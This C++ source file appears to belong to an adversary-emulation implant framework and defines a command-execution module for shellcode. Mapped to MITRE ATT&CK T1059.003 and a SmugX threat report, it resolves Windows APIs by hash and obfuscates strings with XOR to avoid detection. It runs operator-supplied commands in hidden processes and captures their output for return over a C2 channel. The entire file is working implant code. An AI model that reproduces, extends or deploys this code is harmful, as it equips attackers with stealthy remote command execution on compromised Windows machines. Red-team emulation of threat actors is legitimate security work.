#include "module_registry.hpp"
#include "ExecuteCommand.hpp"
#include <al/import.hpp>
#include "util.hpp"
#include "fnv1a.hpp"

// Populates function pointers for use throughout shellcode
DWORD FetchFunctions(cmdexec_pointers* fp) {
    auto kernel32 = GM(L"KERNEL32.DLL", by_ror13);
    if (!kernel32) {
        return FAIL_GET_KERNEL32;
    }

    auto llw = GP(kernel32, LoadLibraryW, by_fnv1a);
    if (!llw) {
        return FAIL_GET_LOADLIBRARYW;
    }

    HMODULE msvcrt = llw(L"msvcrt.dll"_xor);
    if (!msvcrt) {
        return CUSTOM_MODULE_EXECUTECOMMAND_FAIL_GET_MSVCRT;
    }

    fp->fp_CreateProcessA = GP(kernel32, CreateProcessA, by_fnv1a);
    if (!(fp->fp_CreateProcessA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CREATEPROCESSA;
    }

    fp->fp_ReadFile = GP(kernel32, ReadFile, by_fnv1a);
    if (!(fp->fp_ReadFile)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_READFILE;
    }

    fp->fp_CloseHandle = GP(kernel32, CloseHandle, by_fnv1a);
    if (!(fp->fp_CloseHandle)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CLOSEHANDLE;
    }

    fp->fp_CreatePipe = GP(kernel32, CreatePipe, by_fnv1a);
    if (!(fp->fp_CreatePipe)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CREATEPIPE;
    }

    fp->fp_WaitForSingleObject = GP(kernel32, WaitForSingleObject, by_fnv1a);
    if (!(fp->fp_WaitForSingleObject)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_WAITFORSINGLEOBJECT;
    }

    fp->fp_GetLastError = GP(kernel32, GetLastError, by_fnv1a);
    if (!(fp->fp_GetLastError)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_WAITFORSINGLEOBJECT;
    }

    fp->fp_malloc = GP(msvcrt, malloc, by_fnv1a);
    if (!(fp->fp_malloc)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_MALLOC;
    }

    fp->fp_free = GP(msvcrt, free, by_fnv1a);
    if (!(fp->fp_free)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_FREE;
    }

    fp->fp_strncpy = GP(msvcrt, strncpy, by_fnv1a);
    if (!fp->fp_strncpy) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_STRNCPY;
    }

    return ERROR_SUCCESS;
}

/*
 * HandleExecuteCommand:
 *      About:
 *          Creates process to execute commands and captures command output to
 *          send back via C2 channel.
 *      Result:
 *          Command execution
 *      MITRE ATT&CK Techniques:
 *          T1059.003: Command and Scripting Interpreter: Windows Command Shell
 *      CTI:
 *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
 */
void HandleExecuteCommand(void* data, void* context, logger_ctx* log_ctx) {
    cmdexec_pointers* ctx = (cmdexec_pointers*)context;
    module_context_t* m_ctx = (module_context_t*)data;

    if (ctx && m_ctx->argc > 0) {
        HANDLE hRead = NULL;
        HANDLE hWrite = NULL;
        SECURITY_ATTRIBUTES sa = { sizeof(sa),NULL, TRUE  };

        if (!ctx->fp_CreatePipe(&hRead, &hWrite, &sa, 0)) {
            AesLogger::LogError(log_ctx, "Failed to create pipe for command output. Error code: %d."_xor, ctx->fp_GetLastError());
            m_ctx->output = (char*)"Failed to create pipe for command output.";
            m_ctx->outputSize = strlen((char*)m_ctx->output);
            return;
        }

        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;

        char cmdline[512];
        ctx->fp_strncpy(cmdline, m_ctx->argv[0], sizeof(cmdline) - 1);
        cmdline[sizeof(cmdline) - 1] = 0;

        AesLogger::LogDebug(log_ctx, "Running command: %s"_xor, cmdline);
        if (!ctx->fp_CreateProcessA(
            NULL, cmdline, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                AesLogger::LogError(log_ctx, "Failed to create process for command. Error code: %d."_xor, ctx->fp_GetLastError());
                m_ctx->output = (char*)"Failed to create process for command.";
                m_ctx->outputSize = strlen((char*)m_ctx->output);

                ctx->fp_CloseHandle(hWrite);
                ctx->fp_CloseHandle(hRead);
                return;
        }
        AesLogger::LogDebug(log_ctx, "Created process with PID %d"_xor, pi.dwProcessId);

        ctx->fp_CloseHandle(hWrite);

        char buffer[512];
        DWORD read = 0;
        DWORD bytesRead = 0;
        DWORD totalSize = 0;
        char* outputBuffer = (char*)ctx->fp_malloc(1);
        if (outputBuffer) {
            while (ctx->fp_ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                char* newBuffer = (char*)ctx->fp_malloc(totalSize + bytesRead + 1);
                if (!newBuffer) {
                    ctx->fp_free(outputBuffer);
                    AesLogger::LogError(log_ctx, "Failed to reallocate memory for output."_xor);
                    m_ctx->output = (char*)"Failed to reallocate memory for output.";
                    m_ctx->outputSize = strlen((char*)m_ctx->output);
                    return;
                }

                pi_memcpy(newBuffer, outputBuffer, totalSize);
                pi_memcpy(newBuffer + totalSize, buffer, bytesRead);
                totalSize += bytesRead;
                newBuffer[totalSize] = '\0';
                ctx->fp_free(outputBuffer);
                outputBuffer = newBuffer;
            }

            AesLogger::LogDebug(log_ctx, "Fetched %d bytes of process output"_xor, totalSize);

            m_ctx->output = outputBuffer;
            m_ctx->outputSize = totalSize;
            m_ctx->outputAlloc = TRUE;
        } else {
            AesLogger::LogError(log_ctx, "Failed to allocate memory for output."_xor);
            m_ctx->output = (char*)"Failed to allocate memory for output.";
            m_ctx->outputSize = strlen((char*)m_ctx->output);
        }

        ctx->fp_CloseHandle(hRead);

        AesLogger::LogDebug(log_ctx, "Waiting for process to terminate."_xor);
        ctx->fp_WaitForSingleObject(pi.hProcess, INFINITE);
        ctx->fp_CloseHandle(pi.hThread);
        ctx->fp_CloseHandle(pi.hProcess);
    }
    return;
}

DWORD RegisterModule_ExecuteCommand(sh_context* ctx, uint32_t module_id) {

    cmdexec_pointers* m_ctx = (cmdexec_pointers*)ctx->fp.fp_malloc(sizeof(cmdexec_pointers));
    if (!m_ctx) {
        AesLogger::LogError(ctx->log_ctx, "Failed to allocate memory for module with ID 0x%x"_xor, module_id);
        return CUSTOM_MODULE_EXECUTECOMMAND_FAIL_MALLOC_STRUCT;
    }

    DWORD result = ERROR_SUCCESS;

    result = FetchFunctions(m_ctx);
    if (result != ERROR_SUCCESS) {
        ctx->fp.fp_free(m_ctx);
        AesLogger::LogError(ctx->log_ctx, "Failed to fetch functions for module with ID 0x%x. Error code: %d"_xor, module_id, result);
        return CUSTOM_MODULE_EXECUTECOMMAND_FAIL_GET_POINTERS;
    }

    result = RegisterModule(ctx, module_id, HandleExecuteCommand, m_ctx);
    if (result != ERROR_SUCCESS) {
        ctx->fp.fp_free(m_ctx);
        AesLogger::LogError(ctx->log_ctx, "Failed to register module ID 0x%x. Error code: %d"_xor, module_id, result);
        return CUSTOM_MODULE_EXECUTECOMMAND_FAIL_REGISTER_MODULE;
    }

    AesLogger::LogSuccess(ctx->log_ctx, "Successfully registered module 0x%x."_xor, module_id);

    return result;
}
